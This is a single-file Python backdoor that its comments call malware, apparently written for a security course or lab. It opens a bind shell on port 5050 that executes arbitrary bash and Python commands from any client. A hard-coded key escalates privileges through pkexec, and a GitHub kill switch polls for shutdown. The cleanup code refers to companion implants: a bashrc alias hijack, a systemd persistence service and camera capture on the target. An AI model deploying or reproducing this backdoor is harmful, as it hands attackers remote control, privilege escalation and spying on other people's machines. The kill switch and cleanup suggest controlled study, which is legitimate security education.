#!/usr/bin/env python3

# This is all in one file to make it easier to transfer to the remote machine
# That does NOT mean we can't organize it nicely using functions and classes!

# NOTE: Do not put dependencies that require pip install X here!
# Put it inside of the function that bootstraps them instead
import os
import socket
import subprocess
import sys
import time
import threading


THIS_FILE = os.path.realpath(__file__)
KILLSWITCH_URL = "https://raw.githubusercontent.com/lleo022/test/main/killswitch.txt"
KILLSWITCH_INTERVAL = 60  # check every 60 seconds


# Internal use only - if you need to run commands, call subprocess.Popen directly instead 
def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )


# listen on port 5050, receive input
HOST, PORT = "0.0.0.0", 5050


def kill_others():
    """
    Since a port can only be bound by one program, kill all other programs on this port that we can see.
    This makes it so if we run our script multiple times, only the most up-to-date/priviledged one will be running in the end
    """
    # check if privilege escalated
    # if os.geteuid() == 0:
    # if so, kill all other non-privileged copies of it
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing", pids)
        for p in pids:
            run_command(f"kill {str(p)}")
        time.sleep(1)


def bootstrap_packages():
    """
    This allows us to install any python package we want as part of our malware.
    In real malware, we would probably packages these extra dependencies with the payload,
    but for simplicitly, we just install it. If you are curious, look into pyinstaller
    """
    print(sys.prefix, sys.base_prefix)
    if sys.prefix == sys.base_prefix:
        # we're not in a venv, make one
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        try:
            run_command(
                [sys.executable, "-m", "pip", "install", "requests", 
                 "--quiet", "--no-warn-script-location"],
                shell=False, capture_output=True
            )
        except:
            pass
        # If you need pip install X packages, here, import them now
        import requests


def killswitch_monitor():
    """
    Periodically poll a github repository to see if a file has been changed.
    If changed, then automatically kill the malware.
    """
    while True:
        try:
            import requests
            response = requests.get(KILLSWITCH_URL, timeout=5)
            if response.text.strip().lower() == "no":
                print("Kill switch triggered. Exiting.")
                cleanup_and_exit()
        except Exception as e:
            print(f"Kill switch check failed: {e}")
        time.sleep(KILLSWITCH_INTERVAL)


def cleanup_and_exit():
    """
    Helper function for killswitch_monitor. Cleans up everything left behind
    by the other implementations.
    """
    import shutil
    # shellshock: server.py and its venv
    try:
        os.remove(THIS_FILE)
    except Exception:
        pass
    try:
        shutil.rmtree(os.path.join(os.path.dirname(THIS_FILE), ".venv"))
    except Exception:
        pass
    # alias_hijack: remove injected alias from ~/.bashrc
    try:
        run_command("sed -i '/alias clear=/d' ~/.bashrc")
    except Exception:
        pass
    # persistance: stop/disable/remove systemd service and log
    try:
        run_command(
            "systemctl stop custom_background.service; "
            "systemctl disable custom_background.service; "
            "rm -f /etc/systemd/system/custom_background.service; "
            "systemctl daemon-reload; "
            "rm -f /tmp/persistence_verification.log"
        )
    except Exception:
        pass
    # camera_capture: remove photo taken on target
    try:
        run_command("rm -f ~/remote_snap.jpg")
    except Exception:
        pass
    print("Cleaned up. Exiting.")
    os.kill(os.getpid(), 9)


def handle_conn(conn, addr):
    with conn:
        print(f"connected by {addr}")
        # If you need to receive more data, you may need to loop
        # Note that there is actually no way to know we have gotten "all" of the data
        # We only know if the connection was closed, but if the client is waiting for us to say something,
        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
        # For example, you could send a length value before any command, decide on null byte as ending,
        # base64 encode every command, etc
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    break
                data = data.strip()                    

                if data == b"supersecretsuperstring": # privesc key here
                    subprocess.run(["chmod", "+x", THIS_FILE])
                    subprocess.Popen(["pkexec", THIS_FILE])
                    sys.exit(0) 

                command = data.decode("utf-8", errors="replace").strip() 
                if not command:
                    continue

                # Run bash commands with `echo run_linux [command here]`
                if command.startswith("run_linux "):
                    bash = command[10:].strip()
                    if not bash:
                        break

                    print("running linux command: " + bash)
                    result = run_command(bash)

                    response = result.stdout + result.stderr
                    if not response: 
                        response = f"Command executed. Exit code: {result.returncode}"
                    conn.sendall(response.encode("utf-8", errors="replace"))
                # Run Python code with `echo run_python [code here]`
                elif command.startswith("run_python "): 
                    python_code = command[11:].strip()
                    if not python_code:
                        break

                    print("running python command: " + python_code)
                    result = subprocess.run([sys.executable, "-c", python_code], capture_output=True, text=True)

                    response = result.stdout + result.stderr
                    if not response: 
                        response = f"Command executed. Exit code: {result.returncode}"
                    conn.sendall(response.encode("utf-8", errors="replace"))

                break
            except Exception as e:
                error_msg = f"Error: {str(e)}\n"
                conn.sendall(error_msg.encode("utf-8"))
                break
         

def main():
    kill_others()
    bootstrap_packages()
    t = threading.Thread(target=killswitch_monitor, daemon=True)
    t.start()


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()  # allows for 10 connections
        print(f"Listening on {HOST}:{PORT}")
        while True:
            try:
                conn, addr = s.accept()
                handle_conn(conn, addr)
            except KeyboardInterrupt:
                raise
            except:
                print("Connection died")


if __name__ == "__main__":
    main()

